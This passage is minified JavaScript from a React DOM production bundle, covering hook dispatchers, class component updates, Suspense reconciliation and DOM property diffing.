u=pn.memoizedState;if(l=u.destroy,r!==null&&vg(r,u.deps)){a.memoizedState=Nu(t,n,l,r);return}}Yt.flags|=e,a.memoizedState=Nu(1|t,n,l,r)}function gv(e,t){return wd(8390656,8,e,t)}function wg(e,t){return Af(2048,8,e,t)}function ew(e,t){return Af(4,2,e,t)}function tw(e,t){return Af(4,4,e,t)}function nw(e,t){if(typeof t=="function")return e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function rw(e,t,n){return n=n!=null?n.concat([e]):null,Af(4,4,nw.bind(null,t,e),n)}function kg(){}function iw(e,t){var n=Pr();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&vg(t,r[1])?r[0]:(n.memoizedState=[e,t],e)}function aw(e,t){var n=Pr();t=t===void 0?null:t;var r=n.memoizedState;return r!==null&&t!==null&&vg(t,r[1])?r[0]:(e=e(),n.memoizedState=[e,t],e)}function sw(e,t,n){return ds&21?(Kr(n,t)||(n=dE(),Yt.lanes|=n,fs|=n,e.baseState=!0),t):(e.baseState&&(e.baseState=!1,sr=!0),e.memoizedState=n)}function $3(e,t){var n=St;St=n!==0&&4>n?n:4,e(!0);var r=Wp.transition;Wp.transition={};try{e(!1),t()}finally{St=n,Wp.transition=r}}function lw(){return Pr().memoizedState}function Y3(e,t,n){var r=Ca(e);if(n={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null},ow(e))uw(t,n);else if(n=WE(e,t,n,r),n!==null){var a=Zn();Gr(n,e,r,a),cw(n,t,r)}}function V3(e,t,n){var r=Ca(e),a={lane:r,action:n,hasEagerState:!1,eagerState:null,next:null};if(ow(e))uw(t,a);else{var l=e.alternate;if(e.lanes===0&&(l===null||l.lanes===0)&&(l=t.lastRenderedReducer,l!==null))try{var u=t.lastRenderedState,f=l(u,n);if(a.hasEagerState=!0,a.eagerState=f,Kr(f,u)){var h=t.interleaved;h===null?(a.next=a,pg(t)):(a.next=h.next,h.next=a),t.interleaved=a;return}}catch{}finally{}n=WE(e,t,a,r),n!==null&&(a=Zn(),Gr(n,e,r,a),cw(n,t,r))}}function ow(e){var t=e.alternate;return e===Yt||t!==null&&t===Yt}function uw(e,t){Jo=Zd=!0;var n=e.pending;n===null?t.next=t:(t.next=n.next,n.next=t),e.pending=t}function cw(e,t,n){if(n&4194240){var r=t.lanes;r&=e.pendingLanes,n|=r,t.lanes=n,eg(e,n)}}var Jd={readContext:Ir,useCallback:Pn,useContext:Pn,useEffect:Pn,useImperativeHandle:Pn,useInsertionEffect:Pn,useLayoutEffect:Pn,useMemo:Pn,useReducer:Pn,useRef:Pn,useState:Pn,useDebugValue:Pn,useDeferredValue:Pn,useTransition:Pn,useMutableSource:Pn,useSyncExternalStore:Pn,useId:Pn,unstable_isNewReconciler:!1},G3={readContext:Ir,useCallback:function(e,t){return si().memoizedState=[e,t===void 0?null:t],e},useContext:Ir,useEffect:gv,useImperativeHandle:function(e,t,n){return n=n!=null?n.concat([e]):null,wd(4194308,4,nw.bind(null,t,e),n)},useLayoutEffect:function(e,t){return wd(4194308,4,e,t)},useInsertionEffect:function(e,t){return wd(4,2,e,t)},useMemo:function(e,t){var n=si();return t=t===void 0?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=si();return t=n!==void 0?n(t):t,r.memoizedState=r.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},r.queue=e,e=e.dispatch=Y3.bind(null,Yt,e),[r.memoizedState,e]},useRef:function(e){var t=si();return e={current:e},t.memoizedState=e},useState:mv,useDebugValue:kg,useDeferredValue:function(e){return si().memoizedState=e},useTransition:function(){var e=mv(!1),t=e[0];return e=$3.bind(null,e[1]),si().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var r=Yt,a=si();if(zt){if(n===void 0)throw Error(Se(407));n=n()}else{if(n=t(),wn===null)throw Error(Se(349));ds&30||GE(r,t,n)}a.memoizedState=n;var l={value:n,getSnapshot:t};return a.queue=l,gv(KE.bind(null,r,l,e),[e]),r.flags|=2048,Nu(9,QE.bind(null,r,l,n,t),void 0,null),n},useId:function(){var e=si(),t=wn.identifierPrefix;if(zt){var n=Ai,r=Ni;n=(r&~(1<<32-Vr(r)-1)).toString(32)+n,t=":"+t+"R"+n,n=Cu++,0<n&&(t+="H"+n.toString(32)),t+=":"}else n=q3++,t=":"+t+"r"+n.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},Q3={readContext:Ir,useCallback:iw,useContext:Ir,useEffect:wg,useImperativeHandle:rw,useInsertionEffect:ew,useLayoutEffect:tw,useMemo:aw,useReducer:qp,useRef:JE,useState:function(){return qp(Su)},useDebugValue:kg,useDeferredValue:function(e){var t=Pr();return sw(t,pn.memoizedState,e)},useTransition:function(){var e=qp(Su)[0],t=Pr().memoizedState;return[e,t]},useMutableSource:YE,useSyncExternalStore:VE,useId:lw,unstable_isNewReconciler:!1},K3={readContext:Ir,useCallback:iw,useContext:Ir,useEffect:wg,useImperativeHandle:rw,useInsertionEffect:ew,useLayoutEffect:tw,useMemo:aw,useReducer:$p,useRef:JE,useState:function(){return $p(Su)},useDebugValue:kg,useDeferredValue:function(e){var t=Pr();return pn===null?t.memoizedState=e:sw(t,pn.memoizedState,e)},useTransition:function(){var e=$p(Su)[0],t=Pr().memoizedState;return[e,t]},useMutableSource:YE,useSyncExternalStore:VE,useId:lw,unstable_isNewReconciler:!1};function qr(e,t){if(e&&e.defaultProps){t=Vt({},t),e=e.defaultProps;for(var n in e)t[n]===void 0&&(t[n]=e[n]);return t}return t}function Xm(e,t,n,r){t=e.memoizedState,n=n(r,t),n=n==null?t:Vt({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var Df={isMounted:function(e){return(e=e._reactInternals)?vs(e)===e:!1},enqueueSetState:function(e,t,n){e=e._reactInternals;var r=Zn(),a=Ca(e),l=Di(r,a);l.payload=t,n!=null&&(l.callback=n),t=ka(e,l,a),t!==null&&(Gr(t,e,a,r),bd(t,e,a))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=Zn(),a=Ca(e),l=Di(r,a);l.tag=1,l.payload=t,n!=null&&(l.callback=n),t=ka(e,l,a),t!==null&&(Gr(t,e,a,r),bd(t,e,a))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=Zn(),r=Ca(e),a=Di(n,r);a.tag=2,t!=null&&(a.callback=t),t=ka(e,a,r),t!==null&&(Gr(t,e,r,n),bd(t,e,r))}};function xv(e,t,n,r,a,l,u){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(r,l,u):t.prototype&&t.prototype.isPureReactComponent?!vu(n,r)||!vu(a,l):!0}function dw(e,t,n){var r=!1,a=Aa,l=t.contextType;return typeof l=="object"&&l!==null?l=Ir(l):(a=or(t)?us:Fn.current,r=t.contextTypes,l=(r=r!=null)?El(e,a):Aa),t=new t(n,l),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=Df,e.stateNode=t,t._reactInternals=e,r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=a,e.__reactInternalMemoizedMaskedChildContext=l),t}function yv(e,t,n,r){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(n,r),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&Df.enqueueReplaceState(t,t.state,null)}function Zm(e,t,n,r){var a=e.stateNode;a.props=n,a.state=e.memoizedState,a.refs={},mg(e);var l=t.contextType;typeof l=="object"&&l!==null?a.context=Ir(l):(l=or(t)?us:Fn.current,a.context=El(e,l)),a.state=e.memoizedState,l=t.getDerivedStateFromProps,typeof l=="function"&&(Xm(e,t,l,n),a.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof a.getSnapshotBeforeUpdate=="function"||typeof a.UNSAFE_componentWillMount!="function"&&typeof a.componentWillMount!="function"||(t=a.state,typeof a.componentWillMount=="function"&&a.componentWillMount(),typeof a.UNSAFE_componentWillMount=="function"&&a.UNSAFE_componentWillMount(),t!==a.state&&Df.enqueueReplaceState(a,a.state,null),Kd(e,n,a,r),a.state=e.memoizedState),typeof a.componentDidMount=="function"&&(e.flags|=4194308)}function Cl(e,t){try{var n="",r=t;do n+=TA(r),r=r.return;while(r);var a=n}catch(l){a=`
Error generating stack: `+l.message+`
`+l.stack}return{value:e,source:t,stack:a,digest:null}}function Yp(e,t,n){return{value:e,source:null,stack:n??null,digest:t??null}}function Jm(e,t){try{console.error(t.value)}catch(n){setTimeout(function(){throw n})}}var X3=typeof WeakMap=="function"?WeakMap:Map;function fw(e,t,n){n=Di(-1,n),n.tag=3,n.payload={element:null};var r=t.value;return n.callback=function(){tf||(tf=!0,u0=r),Jm(e,t)},n}function hw(e,t,n){n=Di(-1,n),n.tag=3;var r=e.type.getDerivedStateFromError;if(typeof r=="function"){var a=t.value;n.payload=function(){return r(a)},n.callback=function(){Jm(e,t)}}var l=e.stateNode;return l!==null&&typeof l.componentDidCatch=="function"&&(n.callback=function(){Jm(e,t),typeof r!="function"&&(Ta===null?Ta=new Set([this]):Ta.add(this));var u=t.stack;this.componentDidCatch(t.value,{componentStack:u!==null?u:""})}),n}function vv(e,t,n){var r=e.pingCache;if(r===null){r=e.pingCache=new X3;var a=new Set;r.set(t,a)}else a=r.get(t),a===void 0&&(a=new Set,r.set(t,a));a.has(n)||(a.add(n),e=dD.bind(null,e,t,n),t.then(e,e))}function bv(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function Ev(e,t,n,r,a){return e.mode&1?(e.flags|=65536,e.lanes=a,e):(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(t=Di(-1,1),t.tag=2,ka(n,t,1))),n.lanes|=1),e)}var Z3=Hi.ReactCurrentOwner,sr=!1;function Qn(e,t,n,r){t.child=e===null?zE(t,null,n,r):kl(t,e.child,n,r)}function wv(e,t,n,r,a){n=n.render;var l=t.ref;return hl(t,a),r=bg(e,t,n,r,l,a),n=Eg(),e!==null&&!sr?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a,ji(e,t,a)):(zt&&n&&og(t),t.flags|=1,Qn(e,t,r,a),t.child)}function kv(e,t,n,r,a){if(e===null){var l=n.type;return typeof l=="function"&&!_g(l)&&l.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(t.tag=15,t.type=l,pw(e,t,l,r,a)):(e=Sd(n.type,null,r,t,t.mode,a),e.ref=t.ref,e.return=t,t.child=e)}if(l=e.child,!(e.lanes&a)){var u=l.memoizedProps;if(n=n.compare,n=n!==null?n:vu,n(u,r)&&e.ref===t.ref)return ji(e,t,a)}return t.flags|=1,e=Sa(l,r),e.ref=t.ref,e.return=t,t.child=e}function pw(e,t,n,r,a){if(e!==null){var l=e.memoizedProps;if(vu(l,r)&&e.ref===t.ref)if(sr=!1,t.pendingProps=r=l,(e.lanes&a)!==0)e.flags&131072&&(sr=!0);else return t.lanes=e.lanes,ji(e,t,a)}return e0(e,t,n,r,a)}function mw(e,t,n){var r=t.pendingProps,a=r.children,l=e!==null?e.memoizedState:null;if(r.mode==="hidden")if(!(t.mode&1))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},It(ll,gr),gr|=n;else{if(!(n&1073741824))return e=l!==null?l.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,It(ll,gr),gr|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=l!==null?l.baseLanes:n,It(ll,gr),gr|=r}else l!==null?(r=l.baseLanes|n,t.memoizedState=null):r=n,It(ll,gr),gr|=r;return Qn(e,t,a,n),t.child}function gw(e,t){var n=t.ref;(e===null&&n!==null||e!==null&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function e0(e,t,n,r,a){var l=or(n)?us:Fn.current;return l=El(t,l),hl(t,a),n=bg(e,t,n,r,l,a),r=Eg(),e!==null&&!sr?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~a,ji(e,t,a)):(zt&&r&&og(t),t.flags|=1,Qn(e,t,n,a),t.child)}function Tv(e,t,n,r,a){if(or(n)){var l=!0;$d(t)}else l=!1;if(hl(t,a),t.stateNode===null)kd(e,t),dw(t,n,r),Zm(t,n,r,a),r=!0;else if(e===null){var u=t.stateNode,f=t.memoizedProps;u.props=f;var h=u.context,m=n.contextType;typeof m=="object"&&m!==null?m=Ir(m):(m=or(n)?us:Fn.current,m=El(t,m));var x=n.getDerivedStateFromProps,g=typeof x=="function"||typeof u.getSnapshotBeforeUpdate=="function";g||typeof u.UNSAFE_componentWillReceiveProps!="function"&&typeof u.componentWillReceiveProps!="function"||(f!==r||h!==m)&&yv(t,u,r,m),ca=!1;var b=t.memoizedState;u.state=b,Kd(t,r,u,a),h=t.memoizedState,f!==r||b!==h||lr.current||ca?(typeof x=="function"&&(Xm(t,n,x,r),h=t.memoizedState),(f=ca||xv(t,n,f,r,b,h,m))?(g||typeof u.UNSAFE_componentWillMount!="function"&&typeof u.componentWillMount!="function"||(typeof u.componentWillMount=="function"&&u.componentWillMount(),typeof u.UNSAFE_componentWillMount=="function"&&u.UNSAFE_componentWillMount()),typeof u.componentDidMount=="function"&&(t.flags|=4194308)):(typeof u.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=h),u.props=r,u.state=h,u.context=m,r=f):(typeof u.componentDidMount=="function"&&(t.flags|=4194308),r=!1)}else{u=t.stateNode,qE(e,t),f=t.memoizedProps,m=t.type===t.elementType?f:qr(t.type,f),u.props=m,g=t.pendingProps,b=u.context,h=n.contextType,typeof h=="object"&&h!==null?h=Ir(h):(h=or(n)?us:Fn.current,h=El(t,h));var E=n.getDerivedStateFromProps;(x=typeof E=="function"||typeof u.getSnapshotBeforeUpdate=="function")||typeof u.UNSAFE_componentWillReceiveProps!="function"&&typeof u.componentWillReceiveProps!="function"||(f!==g||b!==h)&&yv(t,u,r,h),ca=!1,b=t.memoizedState,u.state=b,Kd(t,r,u,a);var C=t.memoizedState;f!==g||b!==C||lr.current||ca?(typeof E=="function"&&(Xm(t,n,E,r),C=t.memoizedState),(m=ca||xv(t,n,m,r,b,C,h)||!1)?(x||typeof u.UNSAFE_componentWillUpdate!="function"&&typeof u.componentWillUpdate!="function"||(typeof u.componentWillUpdate=="function"&&u.componentWillUpdate(r,C,h),typeof u.UNSAFE_componentWillUpdate=="function"&&u.UNSAFE_componentWillUpdate(r,C,h)),typeof u.componentDidUpdate=="function"&&(t.flags|=4),typeof u.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof u.componentDidUpdate!="function"||f===e.memoizedProps&&b===e.memoizedState||(t.flags|=4),typeof u.getSnapshotBeforeUpdate!="function"||f===e.memoizedProps&&b===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=C),u.props=r,u.state=C,u.context=h,r=m):(typeof u.componentDidUpdate!="function"||f===e.memoizedProps&&b===e.memoizedState||(t.flags|=4),typeof u.getSnapshotBeforeUpdate!="function"||f===e.memoizedProps&&b===e.memoizedState||(t.flags|=1024),r=!1)}return t0(e,t,n,r,l,a)}function t0(e,t,n,r,a,l){gw(e,t);var u=(t.flags&128)!==0;if(!r&&!u)return a&&uv(t,n,!1),ji(e,t,l);r=t.stateNode,Z3.current=t;var f=u&&typeof n.getDerivedStateFromError!="function"?null:r.render();return t.flags|=1,e!==null&&u?(t.child=kl(t,e.child,null,l),t.child=kl(t,null,f,l)):Qn(e,t,f,l),t.memoizedState=r.state,a&&uv(t,n,!0),t.child}function xw(e){var t=e.stateNode;t.pendingContext?ov(e,t.pendingContext,t.pendingContext!==t.context):t.context&&ov(e,t.context,!1),gg(e,t.containerInfo)}function Cv(e,t,n,r,a){return wl(),cg(a),t.flags|=256,Qn(e,t,n,r),t.child}var n0={dehydrated:null,treeContext:null,retryLane:0};function r0(e){return{baseLanes:e,cachePool:null,transitions:null}}function yw(e,t,n){var r=t.pendingProps,a=$t.current,l=!1,u=(t.flags&128)!==0,f;if((f=u)||(f=e!==null&&e.memoizedState===null?!1:(a&2)!==0),f?(l=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(a|=1),It($t,a&1),e===null)return Qm(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(t.mode&1?e.data==="$!"?t.lanes=8:t.lanes=1073741824:t.lanes=1,null):(u=r.children,e=r.fallback,l?(r=t.mode,l=t.child,u={mode:"hidden",children:u},!(r&1)&&l!==null?(l.childLanes=0,l.pendingProps=u):l=If(u,r,0,null),e=ss(e,r,n,null),l.return=t,e.return=t,l.sibling=e,t.child=l,t.child.memoizedState=r0(n),t.memoizedState=n0,e):Tg(t,u));if(a=e.memoizedState,a!==null&&(f=a.dehydrated,f!==null))return J3(e,t,u,r,f,a,n);if(l){l=r.fallback,u=t.mode,a=e.child,f=a.sibling;var h={mode:"hidden",children:r.children};return!(u&1)&&t.child!==a?(r=t.child,r.childLanes=0,r.pendingProps=h,t.deletions=null):(r=Sa(a,h),r.subtreeFlags=a.subtreeFlags&14680064),f!==null?l=Sa(f,l):(l=ss(l,u,n,null),l.flags|=2),l.return=t,r.return=t,r.sibling=l,t.child=r,r=l,l=t.child,u=e.child.memoizedState,u=u===null?r0(n):{baseLanes:u.baseLanes|n,cachePool:null,transitions:u.transitions},l.memoizedState=u,l.childLanes=e.childLanes&~n,t.memoizedState=n0,r}return l=e.child,e=l.sibling,r=Sa(l,{mode:"visible",children:r.children}),!(t.mode&1)&&(r.lanes=n),r.return=t,r.sibling=null,e!==null&&(n=t.deletions,n===null?(t.deletions=[e],t.flags|=16):n.push(e)),t.child=r,t.memoizedState=null,r}function Tg(e,t){return t=If({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function td(e,t,n,r){return r!==null&&cg(r),kl(t,e.child,null,n),e=Tg(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function J3(e,t,n,r,a,l,u){if(n)return t.flags&256?(t.flags&=-257,r=Yp(Error(Se(422))),td(e,t,u,r)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(l=r.fallback,a=t.mode,r=If({mode:"visible",children:r.children},a,0,null),l=ss(l,a,u,null),l.flags|=2,r.return=t,l.return=t,r.sibling=l,t.child=r,t.mode&1&&kl(t,e.child,null,u),t.child.memoizedState=r0(u),t.memoizedState=n0,l);if(!(t.mode&1))return td(e,t,u,null);if(a.data==="$!"){if(r=a.nextSibling&&a.nextSibling.dataset,r)var f=r.dgst;return r=f,l=Error(Se(419)),r=Yp(l,r,void 0),td(e,t,u,r)}if(f=(u&e.childLanes)!==0,sr||f){if(r=wn,r!==null){switch(u&-u){case 4:a=2;break;case 16:a=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:a=32;break;case 536870912:a=268435456;break;default:a=0}a=a&(r.suspendedLanes|u)?0:a,a!==0&&a!==l.retryLane&&(l.retryLane=a,Pi(e,a),Gr(r,e,a,-1))}return Lg(),r=Yp(Error(Se(421))),td(e,t,u,r)}return a.data==="$?"?(t.flags|=128,t.child=e.child,t=fD.bind(null,e),a._reactRetry=t,null):(e=l.treeContext,xr=wa(a.nextSibling),yr=t,zt=!0,Yr=null,e!==null&&(Sr[Nr++]=Ni,Sr[Nr++]=Ai,Sr[Nr++]=cs,Ni=e.id,Ai=e.overflow,cs=t),t=Tg(t,r.children),t.flags|=4096,t)}function Sv(e,t,n){e.lanes|=t;var r=e.alternate;r!==null&&(r.lanes|=t),Km(e.return,t,n)}function Vp(e,t,n,r,a){var l=e.memoizedState;l===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:a}:(l.isBackwards=t,l.rendering=null,l.renderingStartTime=0,l.last=r,l.tail=n,l.tailMode=a)}function vw(e,t,n){var r=t.pendingProps,a=r.revealOrder,l=r.tail;if(Qn(e,t,r.children,n),r=$t.current,r&2)r=r&1|2,t.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Sv(e,n,t);else if(e.tag===19)Sv(e,n,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}r&=1}if(It($t,r),!(t.mode&1))t.memoizedState=null;else switch(a){case"forwards":for(n=t.child,a=null;n!==null;)e=n.alternate,e!==null&&Xd(e)===null&&(a=n),n=n.sibling;n=a,n===null?(a=t.child,t.child=null):(a=n.sibling,n.sibling=null),Vp(t,!1,a,n,l);break;case"backwards":for(n=null,a=t.child,t.child=null;a!==null;){if(e=a.alternate,e!==null&&Xd(e)===null){t.child=a;break}e=a.sibling,a.sibling=n,n=a,a=e}Vp(t,!0,n,null,l);break;case"together":Vp(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function kd(e,t){!(t.mode&1)&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function ji(e,t,n){if(e!==null&&(t.dependencies=e.dependencies),fs|=t.lanes,!(n&t.childLanes))return null;if(e!==null&&t.child!==e.child)throw Error(Se(153));if(t.child!==null){for(e=t.child,n=Sa(e,e.pendingProps),t.child=n,n.return=t;e.sibling!==null;)e=e.sibling,n=n.sibling=Sa(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function eD(e,t,n){switch(t.tag){case 3:xw(t),wl();break;case 5:$E(t);break;case 1:or(t.type)&&$d(t);break;case 4:gg(t,t.stateNode.containerInfo);break;case 10:var r=t.type._context,a=t.memoizedProps.value;It(Gd,r._currentValue),r._currentValue=a;break;case 13:if(r=t.memoizedState,r!==null)return r.dehydrated!==null?(It($t,$t.current&1),t.flags|=128,null):n&t.child.childLanes?yw(e,t,n):(It($t,$t.current&1),e=ji(e,t,n),e!==null?e.sibling:null);It($t,$t.current&1);break;case 19:if(r=(n&t.childLanes)!==0,e.flags&128){if(r)return vw(e,t,n);t.flags|=128}if(a=t.memoizedState,a!==null&&(a.rendering=null,a.tail=null,a.lastEffect=null),It($t,$t.current),r)break;return null;case 22:case 23:return t.lanes=0,mw(e,t,n)}return ji(e,t,n)}var bw,i0,Ew,ww;bw=function(e,t){for(var n=t.child;n!==null;){if(n.tag===5||n.tag===6)e.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===t)break;for(;n.sibling===null;){if(n.return===null||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};i0=function(){};Ew=function(e,t,n,r){var a=e.memoizedProps;if(a!==r){e=t.stateNode,rs(di.current);var l=null;switch(n){case"input":a=Sm(e,a),r=Sm(e,r),l=[];break;case"select":a=Vt({},a,{value:void 0}),r=Vt({},r,{value:void 0}),l=[];break;case"textarea":a=Dm(e,a),r=Dm(e,r),l=[];break;default:typeof a.onClick!="function"&&typeof r.onClick=="function"&&(e.onclick=Wd)}_m(n,r);var u;n=null;for(m in a)if(!r.hasOwnProperty(m)&&a.hasOwnProperty(m)&&a[m]!=null)if(m==="style"){var f=a[m];for(u in f)f.hasOwnProperty(u)&&(n||(n={}),n[u]="")}else m!=="dangerouslySetInnerHTML"&&m!=="children"&&m!=="suppressContentEditableWarning"&&m!=="suppressHydrationWarning"&&m!=="autoFocus"&&(fu.hasOwnProperty(m)?l||(l=[]):(l=l||[]).push(m,null));for(m in r){var h=r[m];if(f=a!=null?a[m]:void 0,r.hasOwnProperty(m)&&h!==f&&(h!=null||f!=null))if(m==="style")if(f){for(u in f)!f.hasOwnProperty(u)||h&&h.hasOwnProperty(u)||(n||(n={}),n[u]="");for(u in h)h.hasOwnProperty(u)&&f[u]!==h[u]&&(n||(n={}),n[u]=h[u])}else n||(l||(l=[]),l.push(m,n)),n=h;else m==="dangerouslySetInnerHTML"?(h=h?h.__html:void 0,f=f?f.__html:void 0,h!=null&&f!==h&&(l=l||[]).push(m,h)):m==="children"?typeof h!="string"&&typeof h!="number"||(l=l||[]).push(m,""+h):m!=="suppressContentEditableWarning"&&m!=="suppressHydrationWarning"&&(fu.hasOwnProperty(m)?(h!=null&&m==="onScroll"&&Rt("scroll",e),l||f===h||(l=[])):(l=l||[]).push(m,h))}n&&(l=l||[]).push("style",n);var m=l;(t.updateQueue=m)&&(t.flags|=4)}};ww=function(e,t,n,r){n!==r&&(t.flags|=4)};function Lo(e,t){if(!zt)switch(e.tailMode){case"hidden":t=e.tail;for(var n=null;t!==null;)t.alternate!==null&&(n=t),t=t.sibling;n===null?e.tail=null:n.sibling=null;break;case"collapsed":n=e.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:r.sibling=null}}function jn(e){var t=e.alternate!==null&&e.alternate.child===e.child,n=0,r=0;if(t)for(var a=e.child;a!==null;)n|=a.lanes|a.childLanes,r|=a.subtreeFlags&14680064,r|=a.flags&14680064,a.return=e,a=a.sibling;else for(a=e.child;a!==null;)n|=a.lanes|a.childLanes,r|=a.subtreeFlags,r|=a.flags,a.return=e,a=a.sibling;return e.subtreeFlags|=r,e.childLanes=n,t}function tD(e,t,n){var r=t.pendingProps;switch(ug(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return jn(t),null;case 1:return or(t.type)&&qd(),jn(t),null;case 3:return r=t.stateNode,Tl(),Ft(lr),Ft(Fn),yg(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(e===null||e.child===null)&&(Jc(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&!(t.flags&256)||(t.flags|=1024,Yr!==null&&(f0(Yr),Yr=null))),i0(e,t),jn(t),null;case 5:xg(t);var a=rs(Tu.current);if(n=t.type,e!==null&&t.stateNode!=null)Ew(e,t,n,r,a),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!r){if(t.stateNode===null)throw Error(Se(166));return jn(t),null}if(e=rs(di.current),Jc(t)){r=t.stateNode,n=t.type;var l=t.memoizedProps;switch(r[ui]=t,r[wu]=l,e=(t.mode&1)!==0,n){case"dialog":Rt("cancel",r),Rt("close",r);break;case"iframe":case"object":case"embed":Rt("load",r);break;case"video":case"audio":for(a=0;a<$o.length;a++)Rt($o[a],r);break;case"source":Rt("error",r);break;case"img":case"image":case"link":Rt("error",r),Rt("load",r);break;case"details":Rt("toggle",r);break;case"input":Ry(r,l),Rt("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!l.multiple},Rt("invalid",r);break;case"textarea":Fy(r,l),Rt("invalid",r)}_m(n,l),a=null;for(var u in l)if(l.hasOwnProperty(u)){var f=l[u];u==="children"?typeof f=="string"?r.textContent!==f&&(l.suppressHydrationWarning!==!0&&Zc(r.textContent,f,e),a=["children",f]):typeof f=="number"&&r.textContent!==""+f&&(l.suppressHydrationWarning!==!0&&Zc(r.textContent,f,e),a=["children",""+f]):fu.hasOwnProperty(u)&&f!=null&&u==="onScroll"&&Rt("scroll",r)}switch(n){case"input":qc(r),Oy(r,l,!0);break;case"textarea":qc(r),My(r);break;case"select":case"option":break;default:typeof l.onClick=="function"&&(r.onclick=Wd)}r=a,t.updateQueue=r,r!==null&&(t.flags|=4)}else{u=a.nodeType===9?a:a.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=K2(n)),e==="http://www.w3.org/1999/xhtml"?n==="script"?(e=u.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof r.is=="string"?e=u.createElement(n,{is:r.is}):(e=u.createElement(n),n==="select"&&(u=e,r.multiple?u.multiple=!0:r.size&&(u.size=r.size))):e=u.createElementNS(e,n),e[ui]=t,e[wu]=r,bw(e,t,!1,!1),t.stateNode=e;e:{switch(u=Im(n,r),n){case"dialog":Rt("cancel",e),Rt("close",e),a=r;break;case"iframe":case"object":case"embed":Rt("load",e),a=r;break;case"video":case"audio":for(a=0;a<$o.length;a++)Rt($o[a],e);a=r;break;case"source":Rt("error",e),a=r;break;case"img":case"image":case"link":Rt("error",e),Rt("load",e),a=r;break;case"details":Rt("toggle",e),a=r;break;case"input":Ry(e,r),a=Sm(e,r),Rt("invalid",e);break;case"option":a=r;break;case"select":e._wrapperState={wasMultiple:!!r.multiple},a=Vt({},r,{value:void 0}),Rt("invalid",e);break;case"textarea":Fy(e,r),a=Dm(e,r),Rt("invalid",e);break;default:a=r}_m(n,a),f=a;for(l in f)if(f.hasOwnProperty(l)){var h=f[l];l==="style"?J2(e,h):l==="dangerouslySetInnerHTML"?(h=h?h.__html:void 0,h!=null&&X2(e,h)):l==="children"?typeof h=="string"?(n!=="textarea"||h!=="")&&hu(e,h):typeof 